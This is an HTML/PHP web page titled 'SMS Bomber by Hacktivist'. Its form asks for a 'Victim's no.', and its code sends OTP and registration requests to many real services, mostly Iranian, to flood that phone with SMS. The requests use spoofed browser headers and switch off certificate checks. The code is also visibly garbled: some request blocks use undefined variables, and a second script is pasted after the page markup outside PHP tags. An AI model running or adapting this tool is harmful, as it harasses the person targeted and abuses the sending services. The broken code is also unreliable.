<!DOCTYPE html><html><head><link href="https://stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet" integrity="sha384-wvfXpqpZZVQGK6TAh5PVlGOfQNHSoD2xbE+QkPxCAFlNEevoEH3Sl0sibVcOQVnN" crossorigin="anonymous"><link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.4.1/css/bootstrap.min.css" integrity="sha384-Vkoo8x4CGsO3+Hhxv8T/Q5PaXtkKtu6ug5TOeNV6gBiFeWPGFN9MuhOf23Q9Ifjh" crossorigin="anonymous"><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css"><link href="https://fonts.googleapis.com/css2?family=Fredoka+One&family=Girassol&display=swap" rel="stylesheet"><link href="https://fonts.googleapis.com/css2?family=Baloo+Thambi+2&family=Josefin+Sans:ital,wght@1,500&display=swap" rel="stylesheet"><link href="https://fonts.googleapis.com/css2?family=Staatliches&display=swap" rel="stylesheet"><link href="https://fonts.googleapis.com/css2?family=Anton&display=swap" rel="stylesheet"><link href="https://fonts.googleapis.com/css2?family=Arimo:ital@1&display=swap" rel="stylesheet"><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><link href="https://fonts.googleapis.com/css2?family=Lato&display=swap" rel="stylesheet">
<style type="text/css">
*{padding:0px; margin:0px; }
</style><title>SMS  Bomber by Hacktivist</title></head><body class="bg-info"><nav class="navbar sticky-top navbar-light" style="background-color: #707070;><div class="container-fluid"><a class="navbar-brand" href="/"><span class="text-danger" style="font-family: 'Staatliches', cursive;">~SMS Bomber Hacktivist~</span></a></div></nav><br><br><br><?php
error_reporting(0); /*it will not let you show errors*/

if(isset($_GET['submit'])){
 header('refresh: 3'); // comment this code, if not to refresh the page.
$gv=$_GET['gg'];
function RandomNumber($length){
$str="";
for($i=0;$i<$length;$i++){
$str.=mt_rand(0,9);}return $str;}
$f = array("sameer","suresh","chettiar","jatin","chauhan","agarwal","rahul","tanmay","tiwari","kunal","rasania","sunil","kumar","gaurav","arihant","jain","falguni","yashashree","arpi","arshish","gupta","tanmay","samtgr","kiyera","atul","abhay","chandra","shoibaakriti","aanchal","talreja","aatholiy","abhijeet","akkalwar","abhijeet","bajpai","abhijeetsh","abhirup","roy","abhishek","sumit","kapil","suman","rani","ramu","souvik","yogesh","umesh","sahadat","ankit","prasant","pravakar","sunil","sibaram");
$fname = $f[mt_rand(0,50)];
$no = rand(1,999);
function rando($length) {
$characters = '0123456789abcdefghijklmnopqrstuvwxyz';
$charactersLength = strlen($characters);
$randomString = '';
for($i = 0; $i < $length; $i++) {
$randomString .= $characters[rand(0, $charactersLength - 1)];}
return $randomString;}


$digit_2 = RandomNumber(2);

$digit_5 = RandomNumber(7);

$first_name = $fname;

$mobile = $_REQUEST['mobile'];


$url1="https://api.nnnow.com/m/mobapi/otp/generateOtp/v1/flash";

$data1='{"mobileNumber":"'.$mobile.'"}';


$headers1[]='POST/m/mobapi/otp/generateOtp/v1/flash HTTP/1.1';
$headers1[]='package: com.nnnow.arvind';
$headers1[]='isTablet: false';
$headers1[]='appversion: 2.2.0';
$headers1[]='platform: android';
$headers1[]='correlationId: 11cd4a6d-de5b-439d-abbb-947b33f9f386';
$headers1[]='module: android';
$headers1[]='Content-Type: application/json; charset=UTF-8';
$headers1[]='Host: api.nnnow.com';
$headers1[]='Connection: Keep-Alive';
$headers1[]='Accept-Encoding: gzip';
$headers1[]='User-Agent: okhttp/3.12.1';

$udata1=str_replace("\n", "", $data1); $headers1[]='Content-length: '.strlen($udata1).''; $uurl1= str_replace("\n", "", $url1); $uheaders1=str_replace("\n", "", $headers1); $ch=curl_init();curl_setopt($ch, CURLOPT_URL,$uurl1);curl_setopt($ch, CURLOPT_HEADER,0);curl_setopt($ch, CURLOPT_HTTPHEADER,$uheaders1);curl_setopt($ch, CURLOPT_SSL_VERIFYHOST,0);curl_setopt($ch, CURLOPT_SSL_VERIFYPEER,0);curl_setopt($ch, CURLOPT_POST, 1);curl_setopt($ch, CURLOPT_POSTFIELDS,$udata1);curl_setopt($ch, CURLOPT_RETURNTRANSFER,1);curl_setopt($ch, CURLOPT_FOLLOWLOCATION,0);$one=curl_exec($ch);json_encode($one);$json=json_decode($one,1);curl_close ($ch);curl_close ($ch);
$udata2=str_replace("\n", "", $data2); $headers2[]='Content-length: '.strlen($udata2).''; $uurl2= str_replace("\n", "", $url2); $uheaders2=str_replace("\n", "", $headers2); $ch=curl_init();curl_setopt($ch, CURLOPT_URL,$uurl2);curl_setopt($ch, CURLOPT_HEADER,0);curl_setopt($ch, CURLOPT_HTTPHEADER,$uheaders2);curl_setopt($ch, CURLOPT_SSL_VERIFYHOST,0);curl_setopt($ch, CURLOPT_SSL_VERIFYPEER,0);curl_setopt($ch, CURLOPT_POST, 1);curl_setopt($ch, CURLOPT_POSTFIELDS,$udata2);curl_setopt($ch, CURLOPT_RETURNTRANSFER,1);curl_setopt($ch, CURLOPT_FOLLOWLOCATION,0);$two=curl_exec($ch);json_encode($two);$json=json_decode($two,1);curl_close ($ch);curl_close ($ch);
$udata3=str_replace("\n", "", $data3); $headers3[]='Content-length: '.strlen($udata3).''; $uurl3= str_replace("\n", "", $url3); $uheaders3=str_replace("\n", "", $headers3); $ch=curl_init();curl_setopt($ch, CURLOPT_URL,$uurl3);curl_setopt($ch, CURLOPT_HEADER,0);curl_setopt($ch, CURLOPT_HTTPHEADER,$uheaders3);curl_setopt($ch, CURLOPT_SSL_VERIFYHOST,0);curl_setopt($ch, CURLOPT_SSL_VERIFYPEER,0);curl_setopt($ch, CURLOPT_POST, 1);curl_setopt($ch, CURLOPT_POSTFIELDS,$udata3);curl_setopt($ch, CURLOPT_RETURNTRANSFER,1);curl_setopt($ch, CURLOPT_FOLLOWLOCATION,0);$three=curl_exec($ch);json_encode($three);$json=json_decode($three,1);curl_close ($ch);curl_close ($ch);
if(strlen($mobile)==10){
$message = "Boomb!!! .. SMS Bombing started on $mobile";
}else{$message = "Please Enter valid number";}

echo "<div class='container text-center my-4'><div style='background-color: #fff;'><br>
<h4 class='pb-2 text-info'>Message</h4><p class='text-danger font-weight-bold'> $message </p><br></div></div><br><br></div>";}if(!isset($_GET['submit'])){echo"
<div class='mx-3 bg-info'><br><div class= 'container my-3' style='background-color: #fff;'><br><br><form class='py-3 text-center' method='get' action=''><div class='input-group my-4'>
<div class='input-group my-4'><span class='input-group-text text-white bg-danger' id='inputGroup-sizing-default'>Victim's no.</span>
<input type='number' class='form-control' placeholder='mobile no' name = 'mobile' aria-label='Sizing example input' aria-describedby='inputGroup-sizing-default' required>
</div><input class='sbm btn font-weight-bold btn-info col-6 my-3 text-center' name='submit' type='submit' value='Bomb'></div>";
}?>
<br><hr>
<h1>Devloped by Soumojit Saha</h1>
<a href="https://www.youtube.com/c/hacktivist"><button type="button" class="btn btn-outline-dark" target='*_blank'>Subscribe Youtube Channel</button></a>

if($_GET["mobile"])
{

    $mobile = $_GET["mobile"];
    
    echo "Mobile= " , "$mobile";
    echo'</br>';
    echo 'Process Sucssfull!!';
    
/////////////////////////////////////////////////////////////////////////////////////////////////

$url = "https://www.baneh.com/mobilelogin/mobile/sentOtpByReg/?mobile=$mobile";

$curl = curl_init($url);
curl_setopt($curl, CURLOPT_URL, $url);
curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);

$headers = array(
   "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36 Edg/92.0.902.55",
);
curl_setopt($curl, CURLOPT_HTTPHEADER, $headers);
//for debug only!
curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, false);
curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);

$resp1 = curl_exec($curl);

/////////////////////////////////////////////////////////////////////////////////////////////////////////////

$url = "https://api.taaghche.com/v4/site/auth/login";

$curl = curl_init($url);
curl_setopt($curl, CURLOPT_URL, $url);
curl_setopt($curl, CURLOPT_POST, true);
curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);

$headers = array(
   "Accept-Encoding: gzip, deflate, br",
   "Accept-Language: fa,en-US;q=0.9,en;q=0.8",
   "Connection: keep-alive",
   "Content-Length: 42",
   "Content-Type: application/json",
   "Host: api.taaghche.com",
   "Origin: https://taaghche.com",
   "Referer: https://taaghche.com/",
   "sec-ch-ua-mobile: ?0",
   "Sec-Fetch-Dest: empty",
   "Sec-Fetch-Mode: cors",
   "Sec-Fetch-Site: same-site",
   "session: undefined",
   "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36 Edg/92.0.902.55",
);
curl_setopt($curl, CURLOPT_HTTPHEADER, $headers);

$data = '{"contact":"'.$mobile.'","forceOtp":false}';

curl_setopt($curl, CURLOPT_POSTFIELDS, $data);

//for debug only!
curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, false);
curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);

$resp2 = curl_exec($curl);

///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

$url = "https://taraazws.jabama.com/api/v4/account/send-code";

$curl = curl_init($url);
curl_setopt($curl, CURLOPT_URL, $url);
curl_setopt($curl, CURLOPT_POST, true);
curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);

$headers = array(
   "Accept: application/json, text/plain",
   "Accept-Encoding: gzip, deflate, br",
   "Accept-Language: fa,en-US;q=0.9,en;q=0.8",
   "Connection: keep-alive",
   "Content-Length: 24",
   "Content-Type: application/json",
   "Host: taraazws.jabama.com",
   "Origin: https://www.jabama.com",
   "Referer: https://www.jabama.com/",
   "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36 Edg/92.0.902.55",
);
curl_setopt($curl, CURLOPT_HTTPHEADER, $headers);

$data = '{"mobile":"'.$mobile.'"}';

curl_setopt($curl, CURLOPT_POSTFIELDS, $data);

//for debug only!
curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, false);
curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);

$resp3 = curl_exec($curl);

////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

$url = "https://sandbox.sibirani.ir/api/v1/user/invite";

$curl = curl_init($url);
curl_setopt($curl, CURLOPT_URL, $url);
curl_setopt($curl, CURLOPT_POST, true);
curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);

$headers = array(
   "accept: application/json",
   "content-length: 26",
   "Content-Type: application/json",
   "origin: https://developer.sibirani.com",
   "referer: https://developer.sibirani.com/",
   "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36 Edg/92.0.902.55",
);
curl_setopt($curl, CURLOPT_HTTPHEADER, $headers);

$data = '{"username":"'.$mobile.'"}';

curl_setopt($curl, CURLOPT_POSTFIELDS, $data);

//for debug only!
curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, false);
curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);

$resp4 = curl_exec($curl);

//////////////////////////////////////////////////////////////////////////////////////////////////////////////

$url = "https://api.snapp.ir/api/v1/sms/link";

$curl = curl_init($url);
curl_setopt($curl, CURLOPT_URL, $url);
curl_setopt($curl, CURLOPT_POST, true);
curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);

$headers = array(
   "accept: application/json",
   "accept-encoding: gzip, deflate, br",
   "accept-language: fa,en-US;q=0.9,en;q=0.8",
   "content-length: 23",
   "Content-Type: application/json",
   "origin: https://snapp.ir",
   "referer: https://snapp.ir/",
   "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36 Edg/92.0.902.55",
);
curl_setopt($curl, CURLOPT_HTTPHEADER, $headers);

$data = '{"phone":"'.$mobile.'"}';

curl_setopt($curl, CURLOPT_POSTFIELDS, $data);

//for debug only!
curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, false);
curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);

$resp5 = curl_exec($curl);
    
///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

$url = "https://www.sheypoor.com/api/v10.0.0/auth/send";

$curl = curl_init($url);
curl_setopt($curl, CURLOPT_URL, $url);
curl_setopt($curl, CURLOPT_POST, true);
curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);

$headers = array(
   "accept: application/json",
   "accept-encoding: gzip, deflate, br",
   "accept-language: fa,en-US;q=0.9,en;q=0.8",
   "content-length: 26",
   "Content-Type: application/json",
   "origin: https://www.sheypoor.com",
   "referer: https://www.sheypoor.com/session",
   "sec-ch-ua-mobile: ?0",
   "sec-fetch-dest: empty",
   "sec-fetch-mode: cors",
   "sec-fetch-site: same-origin",
   "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36 Edg/92.0.902.55",
);
curl_setopt($curl, CURLOPT_HTTPHEADER, $headers);

$data = '{"username":"'.$mobile.'"}';

curl_setopt($curl, CURLOPT_POSTFIELDS, $data);

//for debug only!
curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, false);
curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);

$resp6 = curl_exec($curl);

////////////////////////////////////////////////////////////////////////////////////////////////////////////

$url = "https://api.divar.ir/v5/auth/authenticate";

$curl = curl_init($url);
curl_setopt($curl, CURLOPT_URL, $url);
curl_setopt($curl, CURLOPT_POST, true);
curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);

$headers = array(
   "accept: application/json, text/plain",
   "accept-encoding: gzip, deflate, br",
   "accept-language: fa,en-US;q=0.9,en;q=0.8",
   "content-length: 23",
   "Content-Type: application/json",
   "origin: https://divar.ir",
   "referer: https://divar.ir/",
   "sec-ch-ua-mobile: ?0",
   "sec-fetch-dest: empty",
   "sec-fetch-mode: cors",
   "sec-fetch-site: same-site",
   "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36 Edg/92.0.902.55",
   "x-standard-divar-error: true",
);
curl_setopt($curl, CURLOPT_HTTPHEADER, $headers);

$data = '{"phone":"'.$mobile.'"}';

curl_setopt($curl, CURLOPT_POSTFIELDS, $data);

//for debug only!
curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, false);
curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);

$resp7 = curl_exec($curl);

/////////////////////////////////////////////////////////////////////////////////////////////////////////////

$url = "https://api.snapp.market/mart/v1/user/loginMobileWithNoPass?cellphone=$mobile";

$curl = curl_init($url);
curl_setopt($curl, CURLOPT_URL, $url);
curl_setopt($curl, CURLOPT_POST, true);
curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);

$headers = array(
   "accept-encoding: gzip, deflate, br",
   "accept-language: fa,en-US;q=0.9,en;q=0.8",
   "content-length: 2",
   "Content-Type: application/json",
   "origin: https://snapp.market",
   "referer: https://snapp.market/",
   "sec-ch-ua-mobile: ?0",
   "sec-fetch-dest: empty",
   "sec-fetch-mode: cors",
   "sec-fetch-site: same-site",
   "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36 Edg/92.0.902.55",
);
curl_setopt($curl, CURLOPT_HTTPHEADER, $headers);

$data = "{}";

curl_setopt($curl, CURLOPT_POSTFIELDS, $data);

//for debug only!
curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, false);
curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);

$resp8 = curl_exec($curl);

/////////////////////////////////////////////////////////////////////////////////////////////////////////
    
$url = "https://shepino.com/wp-admin/admin-ajax.php";

$curl = curl_init($url);
curl_setopt($curl, CURLOPT_URL, $url);
curl_setopt($curl, CURLOPT_POST, true);
curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);

$headers = array(
   "accept-encoding: gzip, deflate, br",
   "accept-language: en-US,en;q=0.9,fa;q=0.8",
   "content-length: 41",
   "origin: https://shepino.com",
   "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.63 Safari/537.36 Edg/102.0.1245.39",
   "x-requested-with: XMLHttpRequest",
   "Content-Type: application/x-www-form-urlencoded",
);
curl_setopt($curl, CURLOPT_HTTPHEADER, $headers);

$data = "action=register_action&number=".$mobile;

curl_setopt($curl, CURLOPT_POSTFIELDS, $data);

//for debug only!
curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, false);
curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);

$resp = curl_exec($curl);
curl_close($curl);
    
$resp9 = curl_exec($curl);

/////////////////////////////////////////////////////////////////////////////////////////////////////////
    
$url = "https://jarchi.me/wp-admin/admin-ajax.php";

$curl = curl_init($url);
curl_setopt($curl, CURLOPT_URL, $url);
curl_setopt($curl, CURLOPT_POST, true);
curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);

$headers = array(
   "accept-encoding: gzip, deflate, br",
   "accept-language: en-US,en;q=0.9,fa;q=0.8",
   "content-length: 41",
   "origin: https://jarchi.me",
   "referer: https://jarchi.me/",
   "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.63 Safari/537.36 Edg/102.0.1245.39",
   "x-requested-with: XMLHttpRequest",
   "Content-Type: application/x-www-form-urlencoded",
);
curl_setopt($curl, CURLOPT_HTTPHEADER, $headers);

$data = "action=register_action&number=".$mobile;

curl_setopt($curl, CURLOPT_POSTFIELDS, $data);

//for debug only!
curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, false);
curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);

$resp10 = curl_exec($curl);

/////////////////////////////////////////////////////////////////////////////////////////////////////////
    
$url = "https://appapi.sms.ir/api/app/auth/sign-up/verification-code";

$curl = curl_init($url);
curl_setopt($curl, CURLOPT_URL, $url);
curl_setopt($curl, CURLOPT_POST, true);
curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);

$headers = array(

   "content-length: 10",
   "Content-Type: application/json",
   "origin: https://app.sms.ir",
   "referer: https://app.sms.ir/",
   "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.63 Safari/537.36 Edg/102.0.1245.39",
);
curl_setopt($curl, CURLOPT_HTTPHEADER, $headers);

$data = substr($mobile,1);

curl_setopt($curl, CURLOPT_POSTFIELDS, $data);

//for debug only!
curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, false);
curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);

$resp11 = curl_exec($curl);

/////////////////////////////////////////////////////////////////////////////////////////////////////////
    
$url = "https://next.zarinpal.com/api/oauth/initialize";

$curl = curl_init($url);
curl_setopt($curl, CURLOPT_URL, $url);
curl_setopt($curl, CURLOPT_POST, true);
curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);

$headers = array(
   "content-length: 26",
   "origin: https://next.zarinpal.com",
   "referer: https://next.zarinpal.com/auth/login",
   "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.63 Safari/537.36 Edg/102.0.1245.39",
   "Content-Type: application/json",
);
curl_setopt($curl, CURLOPT_HTTPHEADER, $headers);

$data = '{"username":"'.$mobile.'"}';

curl_setopt($curl, CURLOPT_POSTFIELDS, $data);

//for debug only!
curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, false);
curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);

$resp12 = curl_exec($curl);
    

/////////////////////////////////////////////////////////////////////////////////////////////////////////
    
$url = "https://api.vandar.io/v2/register/check/mobile";

$curl = curl_init($url);
curl_setopt($curl, CURLOPT_URL, $url);
curl_setopt($curl, CURLOPT_POST, true);
curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);

$headers = array(
   "accept: application/json",

   "access-control-allow-origin: *",
   "content-length: 24",
   "Content-Type: application/json",
   "origin: https://dash.vandar.io",
   "referer: https://dash.vandar.io/",
   "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.63 Safari/537.36 Edg/102.0.1245.39",
   "withcredentials: false",
   "x-csrftoken: example-of-custom-header",
   "x-requested-with: XMLHttpRequest",
);
curl_setopt($curl, CURLOPT_HTTPHEADER, $headers);

$data = '{"mobile":"'.$mobile.'"}';

curl_setopt($curl, CURLOPT_POSTFIELDS, $data);

//for debug only!
curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, false);
curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);

$resp13 = curl_exec($curl);
    
/////////////////////////////////////////////////////////////////////////////////////////////////////////
    
$url = "https://api.atipay.net/user/otp";

$curl = curl_init($url);
curl_setopt($curl, CURLOPT_URL, $url);
curl_setopt($curl, CURLOPT_POST, true);
curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);

$headers = array(
   "accept: application/json, text/plain",
   "accept-encoding: gzip, deflate, br",
   "accept-language: en-US,en;q=0.9,fa;q=0.8",
   "content-length: 30",
   "Content-Type: application/json",
   "origin: https://panel.atipay.net",
   "referer: https://panel.atipay.net/",
   "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.63 Safari/537.36 Edg/102.0.1245.39",
);
curl_setopt($curl, CURLOPT_HTTPHEADER, $headers);

$data = '{"mobileNumber":"'.$mobile.'"}';

curl_setopt($curl, CURLOPT_POSTFIELDS, $data);

//for debug only!
curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, false);
curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);

$resp14 = curl_exec($curl);

/////////////////////////////////////////////////////////////////////////////////////////////////////////    
    
$url = "https://www.portal.ir/site/api/v1/user/validate";

$curl = curl_init($url);
curl_setopt($curl, CURLOPT_URL, $url);
curl_setopt($curl, CURLOPT_POST, true);
curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);

$headers = array(
   "content-length: 24",
   "Content-Type: application/json",
   "origin: https://www.portal.ir",
   "referer: https://www.portal.ir/help/faq/choose-payment-gateway",

   "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.63 Safari/537.36 Edg/102.0.1245.39",
);
curl_setopt($curl, CURLOPT_HTTPHEADER, $headers);

$data = '{"mobile":"'.$mobile.'"}';

curl_setopt($curl, CURLOPT_POSTFIELDS, $data);

//for debug only!
curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, false);
curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);

$resp15 = curl_exec($curl);

?>